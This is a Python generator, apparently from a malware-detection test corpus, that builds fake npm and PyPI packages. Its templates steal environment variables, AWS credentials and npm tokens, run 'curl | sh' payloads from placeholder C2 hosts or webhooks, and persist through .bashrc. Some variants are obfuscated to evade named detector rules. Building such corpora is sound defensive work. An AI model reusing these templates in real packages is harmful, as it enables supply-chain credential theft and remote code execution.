"""Inert malicious-package families. See corpus/__init__.py for the safety properties.

Each generator returns (name, ecosystem, version, files). They are grouped into three tables
(DEV / HELDOUT / ADAPTIVE) at the bottom of the file.
"""

from __future__ import annotations

import random

from .samples import WEBHOOK_POOL, b64, b64z, c2, fill, new_name, npm_files, pypi_files

BENIGN_INIT = 'def hello():\n    return "hello"\n'
BENIGN_JS = "module.exports = function hello() { return 'hello'; };\n"


# =========================================================================== DEV families
def d1_setup_env_exfil(rng, i, used):
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    host = c2(rng)
    if i % 2 == 0:
        setup = fill('''from setuptools import setup
from setuptools.command.install import install
import os, json, urllib.request


class PostInstall(install):
    def run(self):
        install.run(self)
        try:
            data = json.dumps(dict(os.environ)).encode()
            urllib.request.urlopen(urllib.request.Request("https://@@C2@@/collect", data=data))
        except Exception:
            pass


setup(name="@@NAME@@", version="1.2.0", packages=["@@PKG@@"], cmdclass={"install": PostInstall})
''', C2=host, NAME=name, PKG=pkg)
    else:
        setup = fill('''from setuptools import setup
import os, requests

requests.post("https://@@C2@@/e", json=dict(os.environ), timeout=5)
setup(name="@@NAME@@", version="1.2.0", packages=["@@PKG@@"])
''', C2=host, NAME=name, PKG=pkg)
    return name, "pypi", "1.2.0", pypi_files(name, "1.2.0", {"setup.py": setup, f"{pkg}/__init__.py": BENIGN_INIT})


def d2_b64_stage_exec(rng, i, used):
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    stage = fill('import urllib.request\nexec(urllib.request.urlopen("http://@@C2@@/stage2.py").read())\n', C2=c2(rng))
    variants = [
        'import base64\n\n' + BENIGN_INIT + '\nexec(base64.b64decode("@@B@@"))\n',
        'import base64\n\nexec(compile(base64.b64decode("@@B@@"), "<stage>", "exec"))\n\n' + BENIGN_INIT,
        'import base64, zlib\n\nexec(zlib.decompress(base64.b64decode("@@BZ@@")))\n',
    ]
    init = fill(variants[i % 3], B=b64(stage), BZ=b64z(stage))
    return name, "pypi", "0.4.1", pypi_files(name, "0.4.1", {f"{pkg}/__init__.py": init})


def d3_npm_postinstall_download_exec(rng, i, used):
    name = new_name(rng, used)
    host = c2(rng)
    files = {"index.js": BENIGN_JS}
    if i % 3 == 0:
        scripts = {"postinstall": f"curl -s http://{host}/i.sh | sh"}
    elif i % 3 == 1:
        scripts = {"postinstall": f"wget -qO- http://{host}/x | bash"}
    else:
        scripts = {"postinstall": "node setup.js"}
        files["setup.js"] = ("const { execSync } = require('child_process');\n"
                             f"execSync('curl -s http://{host}/i.sh | sh');\n")
    return name, "npm", "2.0.3", npm_files(name, "2.0.3", files, scripts=scripts)


def d4_npm_postinstall_env_exfil(rng, i, used):
    name = new_name(rng, used)
    host = c2(rng)
    if i % 2 == 0:
        js = fill('''const https = require('https');
const data = JSON.stringify(process.env);
const req = https.request({ hostname: '@@C2@@', path: '/c', method: 'POST' });
req.write(data);
req.end();
''', C2=host)
    else:
        js = fill('''const entries = Object.entries(process.env);
fetch('https://@@C2@@/env', { method: 'POST', body: JSON.stringify(entries) }).catch(() => {});
''', C2=host)
    return name, "npm", "1.0.7", npm_files(name, "1.0.7", {"index.js": BENIGN_JS, "scripts/init.js": js},
                                           scripts={"postinstall": "node scripts/init.js"})


TYPOS = ["reqeusts", "urllib4", "colourama", "python-dateutils", "jinja3", "pyyaml-utils"]


def d5_typosquat_cred_stealer(rng, i, used):
    name = TYPOS[i % len(TYPOS)]
    if name in used:
        name = f"{name}x"
    used.add(name)
    pkg = name.replace("-", "_")
    host = c2(rng)
    init = ("from ._telemetry import _sync\n\n\ndef get(url):\n    import requests\n    return requests.get(url)\n")
    tele = fill('''import os
import requests


def _sync():
    p = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(p):
        requests.post("https://@@C2@@/u", data=open(p).read())


_sync()
''', C2=host)
    return name, "pypi", "2.31.0", pypi_files(name, "2.31.0", {f"{pkg}/__init__.py": init, f"{pkg}/_telemetry.py": tele})


def d6_npm_webhook_stealer(rng, i, used):
    name = new_name(rng, used)
    hook = WEBHOOK_POOL[i % len(WEBHOOK_POOL)]
    if i % 2 == 0:
        url = f"https://discord.com/api/webhooks/{hook}"
    else:
        url = "https://api.telegram.org/bot000000:FAKE-TOKEN/sendMessage"
    js = fill('''const fs = require('fs');
const os = require('os');
const https = require('https');

function grab() {
  let tok = '';
  try { tok = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8'); } catch (e) {}
  const body = JSON.stringify({ content: os.hostname() + ' ' + tok });
  const req = https.request('@@URL@@', { method: 'POST', headers: { 'Content-Type': 'application/json' } });
  req.write(body);
  req.end();
}
grab();
''', URL=url)
    return name, "npm", "3.1.0", npm_files(name, "3.1.0", {"index.js": js}, scripts={"postinstall": "node index.js"})


def d7_pypi_pth_exec(rng, i, used):
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    host = c2(rng)
    stage = fill('import urllib.request\nexec(urllib.request.urlopen("http://@@C2@@/p.py").read())\n', C2=host)
    if i % 2 == 0:
        pth = f"import os; exec(__import__('base64').b64decode('{b64(stage)}'))\n"
    else:
        pth = f"import os; os.system(\"curl -s http://{host}/p.sh | sh\")\n"
    return name, "pypi", "1.0.0", pypi_files(name, "1.0.0", {f"{pkg}.pth": pth, f"{pkg}/__init__.py": BENIGN_INIT}, wheel=True)


def d8_dependency_confusion(rng, i, used):
    corp = rng.choice(["acme", "globex", "initech", "umbrella"])
    name = f"{corp}-internal-{rng.choice(['utils', 'auth', 'billing', 'config'])}"
    if name in used:
        name += f"-{i}"
    used.add(name)
    host = c2(rng)
    if i % 2 == 0:
        setup = fill('''from setuptools import setup
import socket, getpass, urllib.request


def _beacon():
    urllib.request.urlopen("http://%s.@@C2@@/ping?u=%s" % (socket.gethostname(), getpass.getuser()))


_beacon()
setup(name="@@NAME@@", version="99.9.9", packages=[])
''', C2=host, NAME=name)
        return name, "pypi", "99.9.9", pypi_files(name, "99.9.9", {"setup.py": setup})
    js = fill('''const os = require('os');
const https = require('https');
https.get('https://@@C2@@/ping?h=' + os.hostname() + '&u=' + os.userInfo().username);
''', C2=host)
    return name, "npm", "99.9.9", npm_files(name, "99.9.9", {"index.js": BENIGN_JS, "beacon.js": js},
                                            scripts={"preinstall": "node beacon.js"})


# ======================================================================= HELD-OUT families
def h1_npm_obfuscator_io(rng, i, used):
    name = new_name(rng, used)
    cmd = f"curl -s http://{c2(rng)}/p | sh"
    js = fill('''var _0x4a1c = ['@@A@@', '@@B@@', '@@C@@'];
var _0x3d2e = function (_0x1b7a) { return _0x4a1c[_0x1b7a - 0x0]; };
var _0x5b1a = require(atob(_0x3d2e(0x0)));
var _0x2c9d = _0x3d2e(0x1);
var _0x1e8f = _0x3d2e(0x2);
var _0x6a7b = _0x5b1a[atob(_0x2c9d)];
var _0x7c8d = function (_0x9e1f) { return _0x6a7b(atob(_0x9e1f)); };
_0x7c8d(_0x1e8f);
var _0x8d9e = _0x3d2e(0x0), _0x9eaf = _0x3d2e(0x1), _0xa0b1 = _0x3d2e(0x2), _0xb1c2 = _0x3d2e(0x0);
''', A=b64("child_process"), B=b64("execSync"), C=b64(cmd))
    return name, "npm", "1.4.2", npm_files(name, "1.4.2", {"index.js": js}, scripts={"postinstall": "node index.js"})


def h2_pypi_multistage_zlib(rng, i, used):
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    host = c2(rng)
    stage = fill('''import os, subprocess
subprocess.run(["sh", "-c", "curl -s http://@@C2@@/s2 | sh"])
''', C2=host)
    init = fill('import base64, zlib\n\n_blob = "@@Z@@"\nexec(zlib.decompress(base64.b64decode(_blob)))\n', Z=b64z(stage))
    return name, "pypi", "0.9.9", pypi_files(name, "0.9.9", {f"{pkg}/__init__.py": init})


def h3_npm_persistence(rng, i, used):
    name = new_name(rng, used)
    host = c2(rng)
    js = fill('''const fs = require('fs');
const os = require('os');
fs.appendFileSync(os.homedir() + '/.bashrc', '\\ncurl -s http://@@C2@@/p.sh | sh\\n');
''', C2=host)
    return name, "npm", "5.0.1", npm_files(name, "5.0.1", {"index.js": BENIGN_JS, "setup.js": js}, scripts={"postinstall": "node setup.js"})


def h4_pypi_ci_gated(rng, i, used):
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    init = fill('''import os

if os.environ.get("CI") or os.environ.get("GITHUB_ACTIONS"):
    import subprocess
    import urllib.request

    _s = urllib.request.urlopen("http://@@C2@@/ci.sh").read()
    subprocess.run(["sh", "-c", _s])
''', C2=c2(rng))
    return name, "pypi", "1.1.0", pypi_files(name, "1.1.0", {f"{pkg}/__init__.py": init})


# ======================================================================== ADAPTIVE families
# Written after reading the v1 rules. Each targets one named assumption.
def a1_getattr_dispatch(rng, i, used):             # assumption: sinks are called by their real name
    name = new_name(rng, used)
    setup = fill('''from setuptools import setup

_m = __import__("o" + "s")
_f = getattr(_m, "sys" + "tem")
_f("curl -s http://@@C2@@/i.sh | sh")
setup(name="@@NAME@@", version="1.0.0", packages=[])
''', C2=c2(rng), NAME=name)
    return name, "pypi", "1.0.0", pypi_files(name, "1.0.0", {"setup.py": setup})


def a2_split_across_files(rng, i, used):           # assumption: fetch and exec live in one scope/file
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    files = {
        f"{pkg}/_net.py": "import urllib.request\n\n\ndef fetch(u):\n    return urllib.request.urlopen(u).read()\n",
        f"{pkg}/_run.py": "def go(code):\n    exec(code)\n",
        f"{pkg}/__init__.py": fill('from ._net import fetch\nfrom ._run import go\n\ngo(fetch("http://@@C2@@/p"))\n', C2=c2(rng)),
    }
    return name, "pypi", "1.0.0", pypi_files(name, "1.0.0", files)


def a3_chr_join_command(rng, i, used):             # assumption: command strings are visible constants
    name = new_name(rng, used)
    cmd = f"curl -s http://{c2(rng)}/i.sh | sh"
    codes = ", ".join(str(ord(ch)) for ch in cmd)
    setup = fill('''from setuptools import setup
import os

_c = "".join(chr(x) for x in [@@CODES@@])
os.system(_c)
setup(name="@@NAME@@", version="1.0.0", packages=[])
''', CODES=codes, NAME=name)
    return name, "pypi", "1.0.0", pypi_files(name, "1.0.0", {"setup.py": setup})


def a4_delayed_trigger(rng, i, used):              # assumption: payloads run at install/import
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    init = fill('''import base64
import urllib.request


def hello():
    return "hello"


def refresh_config():
    code = urllib.request.urlopen("http://@@C2@@/cfg").read()
    exec(code)
''', C2=c2(rng))
    return name, "pypi", "1.0.0", pypi_files(name, "1.0.0", {f"{pkg}/__init__.py": init})


def a5_payload_in_data_file(rng, i, used):         # assumption: code lives in .py files
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    payload = fill('import os\nos.system("curl -s http://@@C2@@/i.sh | sh")\n', C2=c2(rng))
    init = 'import pkgutil\n\nexec(pkgutil.get_data(__name__, "payload.dat"))\n'
    return name, "pypi", "1.0.0", pypi_files(name, "1.0.0", {f"{pkg}/__init__.py": init, f"{pkg}/payload.dat": payload})


def a6_js_split_require(rng, i, used):             # assumption: 'child_process' appears literally
    name = new_name(rng, used)
    js = fill('''const cp = require('child' + '_process');
cp['ex' + 'ecSync']('curl -s http://@@C2@@/i.sh | sh');
''', C2=c2(rng))
    return name, "npm", "1.0.0", npm_files(name, "1.0.0", {"index.js": js}, scripts={"postinstall": "node index.js"})


def a7_py_selective_env_keys(rng, i, used):        # assumption: stealers dump the whole environment
    name = new_name(rng, used)
    setup = fill('''import os
import urllib.parse
import urllib.request
from setuptools import setup

KEYS = ["AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "NPM_TOKEN", "PYPI_TOKEN"]
data = urllib.parse.urlencode({k: os.environ.get(k, "") for k in KEYS}).encode()
urllib.request.urlopen("http://@@C2@@/k", data)
setup(name="@@NAME@@", version="1.0.0", packages=[])
''', C2=c2(rng), NAME=name)
    return name, "pypi", "1.0.0", pypi_files(name, "1.0.0", {"setup.py": setup})


def a8_js_selective_env_keys(rng, i, used):        # assumption: stealers dump the whole environment
    name = new_name(rng, used)
    js = fill('''const https = require('https');
const body = JSON.stringify({ a: process.env.AWS_SECRET_ACCESS_KEY, b: process.env.NPM_TOKEN, c: process.env.GITHUB_TOKEN });
const req = https.request({ hostname: '@@C2@@', path: '/k', method: 'POST' });
req.write(body);
req.end();
''', C2=c2(rng))
    return name, "npm", "1.0.0", npm_files(name, "1.0.0", {"index.js": BENIGN_JS, "init.js": js}, scripts={"postinstall": "node init.js"})


def a9_path_join_credentials(rng, i, used):        # assumption: credential paths appear as one string
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    init = fill('''import os
import urllib.request


def _s():
    p = os.path.join(os.path.expanduser("~"), ".aws", "credentials")
    if os.path.exists(p):
        urllib.request.urlopen(urllib.request.Request("http://@@C2@@/a", data=open(p, "rb").read()))


_s()
''', C2=c2(rng))
    return name, "pypi", "1.0.0", pypi_files(name, "1.0.0", {f"{pkg}/__init__.py": init})


# (family, generator, samples per family)
DEV = [
    ("d1_setup_env_exfil", d1_setup_env_exfil, 6),
    ("d2_b64_stage_exec", d2_b64_stage_exec, 6),
    ("d3_npm_postinstall_download_exec", d3_npm_postinstall_download_exec, 6),
    ("d4_npm_postinstall_env_exfil", d4_npm_postinstall_env_exfil, 6),
    ("d5_typosquat_cred_stealer", d5_typosquat_cred_stealer, 6),
    ("d6_npm_webhook_stealer", d6_npm_webhook_stealer, 6),
    ("d7_pypi_pth_exec", d7_pypi_pth_exec, 6),
    ("d8_dependency_confusion", d8_dependency_confusion, 6),
]
HELDOUT = [
    ("h1_npm_obfuscator_io", h1_npm_obfuscator_io, 5),
    ("h2_pypi_multistage_zlib", h2_pypi_multistage_zlib, 5),
    ("h3_npm_persistence", h3_npm_persistence, 5),
    ("h4_pypi_ci_gated", h4_pypi_ci_gated, 5),
]
ADAPTIVE = [
    ("a1_getattr_dispatch", a1_getattr_dispatch, 3),
    ("a2_split_across_files", a2_split_across_files, 3),
    ("a3_chr_join_command", a3_chr_join_command, 3),
    ("a4_delayed_trigger", a4_delayed_trigger, 3),
    ("a5_payload_in_data_file", a5_payload_in_data_file, 3),
    ("a6_js_split_require", a6_js_split_require, 3),
    ("a7_py_selective_env_keys", a7_py_selective_env_keys, 3),
    ("a8_js_selective_env_keys", a8_js_selective_env_keys, 3),
    ("a9_path_join_credentials", a9_path_join_credentials, 3),
]
